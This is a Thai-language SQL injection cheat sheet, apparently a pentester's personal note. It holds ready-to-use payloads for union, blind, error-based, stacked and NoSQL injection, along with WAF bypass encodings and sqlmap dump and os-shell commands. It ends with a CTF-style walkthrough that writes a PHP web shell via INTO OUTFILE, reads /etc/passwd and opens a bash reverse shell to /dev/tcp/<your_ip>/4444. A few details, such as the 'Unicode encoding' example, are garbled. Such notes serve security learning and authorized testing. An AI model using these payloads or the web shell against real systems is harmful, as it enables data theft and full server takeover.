#web 
# SQL Injection

> [!TIP] การตรวจสอบ SQLi อย่างรวดเร็ว
> ลอง payload พื้นฐาน: `'`, `"`, `' OR '1'='1`, `1' ORDER BY 1--` หรือใช้ [[SQLMap]] สำหรับการตรวจสอบอัตโนมัติ

## ❓ What
SQL Injection เป็นช่องโหว่ที่เกิดจากการรับ input จากผู้ใช้โดยไม่มีการตรวจสอบหรือกรอง ทำให้สามารถแทรก SQL command เข้าไปในคำสั่ง query ที่ถูกส่งไปยัง database ได้ ส่งผลให้ผู้โจมตีสามารถเข้าถึงข้อมูลที่ไม่ได้รับอนุญาต แก้ไขข้อมูล หรือทำลายข้อมูลใน database

**ความรู้พื้นฐาน Database Structure:**
```
Database => Tables => Columns => Data
```

**เทคนิคที่เกี่ยวข้อง:** [[Authentication]], [[🌐 Web application]]

## 🔍 Landmark (Detection)

### การตรวจหาช่องโหว่ SQLi
1. **Error-based Detection** - ส่ง single quote (`'`) เพื่อดูว่ามี SQL error หรือไม่
2. **Boolean-based Detection** - ทดสอบ logic เช่น `1' AND '1'='1` vs `1' AND '1'='2`
3. **Time-based Detection** - ใช้ `SLEEP()` หรือ `WAITFOR DELAY` เพื่อดู response time
4. **Automated Detection** - ใช้ [[SQLMap]] หรือ [[Burp Suite]]

> [!WARNING] ข้อผิดพลาดที่พบบ่อย
> อย่าลืมใส่ comment syntax ที่ถูกต้องตาม database ที่ใช้: MySQL ใช้ `-- -` (มีช่องว่าง), MSSQL ใช้ `--`, Oracle ใช้ `--`
## 🟦 Types of SQL Injection

### 1. Union-Based SQL Injection
ใช้คำสั่ง `UNION` เพื่อรวมผลลัพธ์จาก query ที่เราแทรกเข้าไปกับ query เดิม ทำให้สามารถดึงข้อมูลจาก table อื่นๆ ได้

### 2. Error-Based SQL Injection
ใช้ error message ที่แสดงออกมาเพื่อดึงข้อมูลจาก database โดยใช้ฟังก์ชันที่ทำให้เกิด error แบบมีเงื่อนไข

### 3. Boolean-Based Blind SQL Injection
ไม่มี error message แต่สังเกตจากการเปลี่ยนแปลงของหน้าเว็บ (True/False) เพื่อค่อยๆ ดึงข้อมูลออกมาทีละ bit

### 4. Time-Based Blind SQL Injection
ใช้เวลาในการ response เป็นตัวบอก โดยใช้ฟังก์ชัน `SLEEP()` หรือ `WAITFOR DELAY` เพื่อทำให้ database รอก่อน response

### 5. Stacked Queries SQL Injection
การใช้ semicolon (`;`) เพื่อแทรก SQL statement หลายคำสั่งในครั้งเดียว ใช้ได้กับบาง database เท่านั้น

### 6. Second-Order SQL Injection
ข้อมูลที่แทรก SQLi ไว้ถูกเก็บใน database และถูก execute ในภายหลังเมื่อมีการดึงข้อมูลนั้นมาใช้

### 7. NoSQL Injection
การโจมตีฐานข้อมูล NoSQL เช่น MongoDB โดยใช้ JSON หรือ JavaScript injection

## 🔨 Exploitation

### Union-Based SQL Injection

**Step-by-Step การโจมตี:**

1. **หาจำนวน columns** - ใช้ `ORDER BY` เพื่อหาว่ามีกี่ column
```sql
-- เพิ่มเลขทีละ 1 จนกว่าจะ error แสดงว่ามีจำนวน column น้อยกว่าเลขที่ส่งไป
http://<target_url>/index.php?id=1' ORDER BY 1-- -
http://<target_url>/index.php?id=1' ORDER BY 2-- -
http://<target_url>/index.php?id=1' ORDER BY 3-- -
http://<target_url>/index.php?id=1' ORDER BY 4-- -
```

2. **ดึง database ออกมา** - ใช้ `UNION SELECT` เพื่อรวมผลลัพธ์
```sql
-- 1,3,4 เป็น dummy values ให้ครบตามจำนวน column
http://<target_url>/index.php?id=1' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -

-- MySQL: แสดง database ปัจจุบัน
http://<target_url>/index.php?id=-1' UNION SELECT 1,database(),3,4-- -
```

3. **ดึง table names ออกมา**
```sql
-- ระบุชื่อ database ที่ต้องการหา tables
http://<target_url>/index.php?id=1' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='<database>'-- -

-- หลาย tables ในครั้งเดียว (MySQL)
http://<target_url>/index.php?id=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema='<database>'-- -
```

4. **ดึง column names ออกมา**
```sql
-- ระบุชื่อ table ที่ต้องการหา columns
http://<target_url>/index.php?id=1' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='<table>'-- -

-- แสดงทุก columns ในครั้งเดียว (MySQL)
http://<target_url>/index.php?id=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='<table>'-- -
```

5. **ดึงข้อมูลจาก table**
```sql
-- ดึงข้อมูลจาก columns ที่ต้องการ
http://<target_url>/index.php?id=-1' UNION SELECT 1,username,password,4 FROM <database>.<table>-- -

-- ดึงหลาย rows พร้อมกัน
http://<target_url>/index.php?id=-1' UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4 FROM <database>.<table>-- -
```

### Error-Based SQL Injection

**ใช้สำหรับ MySQL:**
```sql
-- ใช้ EXTRACTVALUE เพื่อดึงข้อมูล
http://<target_url>/index.php?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -

-- ดึง table names
http://<target_url>/index.php?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -

-- ใช้ UPDATEXML
http://<target_url>/index.php?id=1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -
```

**ใช้สำหรับ MSSQL:**
```sql
-- ใช้ CAST เพื่อทำให้เกิด error
http://<target_url>/index.php?id=1' AND 1=CAST((SELECT @@version) AS int)--

-- ดึงข้อมูล user
http://<target_url>/index.php?id=1' AND 1=CONVERT(int,(SELECT SYSTEM_USER))--
```

### Boolean-Based Blind SQL Injection

```sql
-- ทดสอบว่า injection ได้หรือไม่
http://<target_url>/index.php?id=1' AND 1=1-- -  (หน้าเว็บปกติ - True)
http://<target_url>/index.php?id=1' AND 1=2-- -  (หน้าเว็บเปลี่ยน - False)

-- ทดสอบความยาวของ database name
http://<target_url>/index.php?id=1' AND LENGTH(database())=5-- -

-- ดึงตัวอักษรทีละตัวจาก database name
http://<target_url>/index.php?id=1' AND SUBSTRING(database(),1,1)='a'-- -
http://<target_url>/index.php?id=1' AND SUBSTRING(database(),1,1)='b'-- -

-- ใช้ ASCII เพื่อเร่งความเร็ว
http://<target_url>/index.php?id=1' AND ASCII(SUBSTRING(database(),1,1))>97-- -
http://<target_url>/index.php?id=1' AND ASCII(SUBSTRING(database(),1,1))>110-- -
```

### Time-Based Blind SQL Injection

**MySQL:**
```sql
-- ทดสอบด้วย SLEEP
http://<target_url>/index.php?id=1' AND SLEEP(5)-- -

-- Conditional time-based
http://<target_url>/index.php?id=1' AND IF(1=1,SLEEP(5),0)-- -

-- ทดสอบความยาวของ database
http://<target_url>/index.php?id=1' AND IF(LENGTH(database())=5,SLEEP(5),0)-- -

-- ดึงข้อมูลทีละตัวอักษร
http://<target_url>/index.php?id=1' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)-- -
```

**MSSQL:**
```sql
-- ใช้ WAITFOR DELAY
http://<target_url>/index.php?id=1'; WAITFOR DELAY '00:00:05'--

-- Conditional time-based
http://<target_url>/index.php?id=1'; IF (1=1) WAITFOR DELAY '00:00:05'--
```

**PostgreSQL:**
```sql
-- ใช้ pg_sleep
http://<target_url>/index.php?id=1' AND pg_sleep(5)-- -
```

### Stacked Queries SQL Injection

```sql
-- MSSQL: เพิ่ม admin user
http://<target_url>/index.php?id=1'; INSERT INTO users (username,password) VALUES ('admin','pass123')--

-- PostgreSQL: อ่านไฟล์
http://<target_url>/index.php?id=1'; CREATE TABLE temp(data text); COPY temp FROM '/etc/passwd'--

-- MSSQL: enable xp_cmdshell และ execute command
http://<target_url>/index.php?id=1'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--
```

> [!WARNING] Stacked Queries ไม่ได้ผลกับ MySQL ใน PHP
> MySQL มักจะไม่รองรับ stacked queries ใน PHP เพราะ `mysqli_query()` รัน query เดียวต่อครั้ง

### Second-Order SQL Injection

```sql
-- Step 1: Register user ด้วย payload ในชื่อ
Username: admin'-- -
Password: password123

-- Step 2: เมื่อ application ดึงข้อมูล username มาใช้ใน query อื่น
-- Query ที่เกิดขึ้น: SELECT * FROM posts WHERE author='admin'-- -'
-- Comment ส่วนท้ายออก ทำให้ bypass logic
```

### NoSQL Injection (MongoDB)

```javascript
// การ bypass authentication
username[$ne]=admin&password[$ne]=pass

// JSON payload
{"username": {"$ne": null}, "password": {"$ne": null}}

// JavaScript injection
username=admin'||'1'=='1&password=anything

// การดึงข้อมูลด้วย $regex
{"username": {"$regex": "^admin"}}
```

## 🚪 Bypass Techniques

> [!TIP] เทคนิคการ Bypass WAF
> ลองใช้หลายเทคนิคร่วมกัน เช่น encoding + comment injection + case variation

### 1. Comment Injection
```sql
-- MySQL Comment syntax
/*! UNION */ SELECT /*!50000 1,2,3,4 */
/*!12345UNION*//*!12345SELECT*/ 
UNION/**/SELECT/**/

-- Inline comment
UN/**/ION SEL/**/ECT
U/**/N/**/I/**/O/**/N
```

### 2. Case Variation
```sql
-- เปลี่ยนตัวพิมพ์เล็ก-ใหญ่
UnIoN SeLeCt
uNiOn sElEcT
UNION SELECT
union select
```

### 3. Encoding Techniques
```sql
-- URL Encoding
%55%4e%49%4f%4e%20%53%45%4c%45%43%54  (UNION SELECT)

-- Double URL Encoding
%2555%254e%2549%254f%254e  (UNION)

-- Unicode Encoding
UNION  (UNION)

-- Hex Encoding (MySQL)
0x554e494f4e  (UNION)
```

### 4. Whitespace Alternatives
```sql
-- ใช้ tab, newline แทน space
UNION%09SELECT
UNION%0aSELECT
UNION%0dSELECT
UNION%a0SELECT

-- Plus sign
UNION+SELECT
```

### 5. SQL Function Alternatives
```sql
-- แทน SUBSTRING
SUBSTR()
MID()
LEFT()

-- แทน ASCII
ORD()
CHAR()

-- แทน CONCAT
CONCAT_WS()
GROUP_CONCAT()
```

## 🗄️ Database-Specific Techniques

### MySQL
```sql
-- Version detection
SELECT @@version
SELECT version()

-- Current database
SELECT database()

-- List all databases
SELECT schema_name FROM information_schema.schemata

-- Read file
SELECT LOAD_FILE('/etc/passwd')

-- Write file (ต้องมี FILE privilege)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- Current user
SELECT user()
SELECT current_user()
```

### PostgreSQL
```sql
-- Version
SELECT version()

-- Current database
SELECT current_database()

-- List databases
SELECT datname FROM pg_database

-- Read file
CREATE TABLE temp(data text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;

-- Command execution (ต้อง admin)
COPY (SELECT '') TO PROGRAM 'whoami'
```

### MSSQL (Microsoft SQL Server)
```sql
-- Version
SELECT @@version

-- Current database
SELECT DB_NAME()

-- List databases
SELECT name FROM master..sysdatabases

-- Current user
SELECT SYSTEM_USER
SELECT user_name()

-- Read file
CREATE TABLE temp(data varchar(8000));
BULK INSERT temp FROM 'c:\windows\win.ini';
SELECT * FROM temp;

-- Command execution (ต้อง enable xp_cmdshell)
EXEC xp_cmdshell 'whoami'
```

### Oracle
```sql
-- Version
SELECT banner FROM v$version

-- Current database/schema
SELECT user FROM dual

-- List tables
SELECT table_name FROM all_tables

-- List users
SELECT username FROM all_users

-- String concat (ไม่มี CONCAT ใน Oracle เวอร์ชันเก่า)
SELECT 'a'||'b' FROM dual
```

> [!TIP] การหา Database Type
> ลองใช้ error message หรือ version string: `AND 1=1 AND 'mysql'='mysql` หรือดู response headers

## 🛠️ Tool

### SQLMap
[[SQLMap]] เป็น tool automation สำหรับหาและ exploit SQLi

**การใช้งานพื้นฐาน:**
```bash
# Basic scan
sqlmap -u http://<target_url>/page.php?id=1 --dbs

# ระบุ database และ dump tables
sqlmap -u http://<target_url>/page.php?id=1 -D <database> --tables

# Dump ข้อมูลจาก table
sqlmap -u http://<target_url>/page.php?id=1 -D <database> -T <table> --dump

# Dump ทุกอย่าง
sqlmap -u http://<target_url>/page.php?id=1 --dump-all
```

**Advanced - ใช้กับ POST request:**
```bash
# บันทึก request จาก Burp Suite เป็นไฟล์ sql.txt
sqlmap -r sql.txt --dbs -p id

# ระบุ parameter ที่ต้องการ test
sqlmap -r sql.txt -p id -D <database> --tables

# ระบุ cookie
sqlmap -u http://<target_url>/page.php --cookie="PHPSESSID=abcd1234" --dbs

# Bypass WAF level 3
sqlmap -u http://<target_url>/page.php?id=1 --level=3 --risk=3 --dbs
```

**การ Shell upload:**
```bash
# Upload shell ผ่าน SQLMap (MySQL only, ต้องมี FILE privilege)
sqlmap -u http://<target_url>/page.php?id=1 --os-shell

# หรือ upload file
sqlmap -u http://<target_url>/page.php?id=1 --file-write=shell.php --file-dest=/var/www/html/shell.php
```

### Burp Suite
ใช้ [[Burp Suite]] เพื่อ:
- Intercept และแก้ไข request
- ใช้ Intruder สำหรับ automated testing
- ใช้ Repeater เพื่อทดสอบ payload ต่างๆ
- ใช้ Scanner (Pro version) เพื่อหา SQLi โดยอัตโนมัติ

### Manual Testing Tools
```bash
# curl สำหรับทดสอบ manual
curl "http://<target_url>/page.php?id=1%27%20OR%20%271%27=%271"

# หรือใช้ browser console
fetch('http://<target_url>/page.php?id=1\' OR \'1\'=\'1')
```

## 💡 Related

เทคนิคที่เกี่ยวข้อง:
- [[Authentication]] - SQLi มักใช้ bypass login
- [[🌐 Web application]] - ความรู้พื้นฐาน web security
- [[Command Injection]] - อาจใช้ร่วมกับ SQLi เพื่อ RCE
- [[File Upload]] - upload shell หลัง SQLi
- [[XSS]] - stored SQLi อาจนำไปสู่ XSS

Tools:
- [[SQLMap]] - automation tool หลัก
- [[Burp Suite]] - manual testing และ intercept
- [[Hydra]] - brute-force credentials ที่หาได้จาก SQLi
- **Havij** - GUI-based SQLi tool (Windows)
- **jSQL Injection** - Cross-platform GUI tool

## 📚 Example

### CTF Walkthrough: PicoCTF - "Most Cookies"

**ภาพรวม Challenge:**
- Web application ที่ใช้ cookie-based session
- Parameter `user_id` ใน cookie มีช่องโหว่ SQL injection
- เป้าหมาย: หา flag โดยการ exploit SQLi ใน cookie

**Step 1: Reconnaissance**
```bash
# เข้าเว็บและสังเกต cookie
# Cookie: user_id=1; session=xyz

# ทดสอบ SQLi พื้นฐาน
curl -b "user_id=1' OR '1'='1" http://<target_url>/
# ผลลัพธ์: หน้าเว็บเปลี่ยนแปลง แสดงว่ามี SQLi
```

**Step 2: Enumeration**
```bash
# หาจำนวน columns ด้วย ORDER BY
curl -b "user_id=1' ORDER BY 1-- -" http://<target_url>/  # OK
curl -b "user_id=1' ORDER BY 2-- -" http://<target_url>/  # OK
curl -b "user_id=1' ORDER BY 3-- -" http://<target_url>/  # OK
curl -b "user_id=1' ORDER BY 4-- -" http://<target_url>/  # Error
# มี 3 columns

# ทดสอบ UNION SELECT
curl -b "user_id=-1' UNION SELECT 1,2,3-- -" http://<target_url>/
# เห็นเลข 2 และ 3 แสดงบนหน้าเว็บ
```

**Step 3: Database Enumeration**
```bash
# หา database ปัจจุบัน
curl -b "user_id=-1' UNION SELECT 1,database(),3-- -" http://<target_url>/
# Result: cookies_db

# หา tables
curl -b "user_id=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='cookies_db'-- -" http://<target_url>/
# Result: users,flags

# หา columns ใน table flags
curl -b "user_id=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='flags'-- -" http://<target_url>/
# Result: id,flag_value
```

**Step 4: Data Extraction**
```bash
# ดึง flag
curl -b "user_id=-1' UNION SELECT 1,flag_value,3 FROM cookies_db.flags-- -" http://<target_url>/
# Flag: picoCTF{c00k13s_4r3_n0t_s3cur3_4t_4ll}
```

**Step 5: Alternative - ใช้ SQLMap**
```bash
# บันทึก request header ลง cookie.txt
sqlmap -u "http://<target_url>/" --cookie="user_id=1" --level=2 --risk=3 --dbs

# หา tables
sqlmap -u "http://<target_url>/" --cookie="user_id=1" -D cookies_db --tables

# Dump flag
sqlmap -u "http://<target_url>/" --cookie="user_id=1" -D cookies_db -T flags --dump
```

> [!TIP] Key Takeaways
> - SQLi ไม่จำกัดแค่ GET/POST parameters อาจอยู่ใน cookies, headers หรือ JSON
> - ใช้ `GROUP_CONCAT()` เพื่อดึงข้อมูลหลาย rows ในครั้งเดียว
> - UNION-based SQLi เร็วที่สุดถ้าใช้งานได้ หากไม่ได้ผลให้ลอง blind techniques

### Real-World Example: Second-Order SQLi

**Scenario:** Registration form ที่มี second-order SQLi

**Step 1: Register payload**
```sql
-- สมัครสมาชิกด้วย username ที่มี payload
Username: admin'-- -
Password: test123
Email: test@example.com
```

**Step 2: Login และดู profile**
```
-- เมื่อ login แล้ว application ดึงข้อมูล posts ของ user
-- Original query: SELECT * FROM posts WHERE author='admin'-- -'
-- Comment ออกส่วนหลัง ทำให้แสดง posts ของ admin ทั้งหมด
```

**Step 3: Exploit further**
```sql
-- Register ด้วย payload ที่ซับซ้อนขึ้น
Username: admin' UNION SELECT 1,password,3,4 FROM users WHERE username='admin'-- -
-- เมื่อ application ใช้ username นี้ใน query จะเห็น password ของ admin
```

### File Upload via SQLi

**การ upload shell.php ผ่าน SQLi (MySQL + FILE privilege):**

**Step 1: เช็ค permissions**
```sql
http://<target_url>/page.php?id=-1' UNION SELECT 1,user(),file_priv,4 FROM mysql.user WHERE user=current_user()-- -
```

**Step 2: หา web root path**
```sql
http://<target_url>/page.php?id=-1' UNION SELECT 1,@@datadir,3,4-- -
# หรือลอง common paths: /var/www/html/, /var/www/uploads/
```

**Step 3: Upload shell**
```sql
http://<target_url>/page.php?id=-1' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4 INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Step 4: Execute commands**
```bash
# เข้าถึง shell
http://<target_url>/shell.php?cmd=whoami
http://<target_url>/shell.php?cmd=cat /etc/passwd
http://<target_url>/shell.php?cmd=ls -la /root

# หา flag
http://<target_url>/shell.php?cmd=find / -name "flag.txt" 2>/dev/null
http://<target_url>/shell.php?cmd=cat /root/flag.txt
```

### Shell.php Content
```php
<?php
// Simple web shell
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**การใช้งาน:**
```bash
# Basic commands
http://<target_url>/uploads/shell.php?cmd=ls -la
http://<target_url>/uploads/shell.php?cmd=pwd
http://<target_url>/uploads/shell.php?cmd=id

# ค้นหา flag
http://<target_url>/uploads/shell.php?cmd=grep -r "picoCTF" /var/www/
http://<target_url>/uploads/shell.php?cmd=cat /root/flag.txt

# Reverse shell
http://<target_url>/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'
```

> [!WARNING] Web Shell Security
> - Web shell เป็น backdoor ที่อันตราย ใช้เฉพาะใน CTF/pentest ที่ได้รับอนุญาต
> - ห้ามทิ้ง shell ไว้บน production server
> - ใน real-world จะถูก detect ด้วย WAF/IDS อย่างรวดเร็ว

---

**สรุป Key Concepts:**
1. **Union-based** - เร็วและมีประสิทธิภาพที่สุด ใช้เมื่อเห็น output บนหน้าเว็บ
2. **Blind SQLi** - ใช้เมื่อไม่มี output แต่สังเกตจาก behavior หรือ timing
3. **Error-based** - ใช้เมื่อเห็น error message แสดงบนหน้าเว็บ
4. **WAF Bypass** - ใช้ encoding, comment injection, case variation รวมกัน
5. **Database-specific** - แต่ละ DB มี syntax และ feature ต่างกัน ต้องปรับ payload
6. **Automation** - ใช้ [[SQLMap]] เพื่อประหยัดเวลา แต่ควรเข้าใจ manual technique ก่อน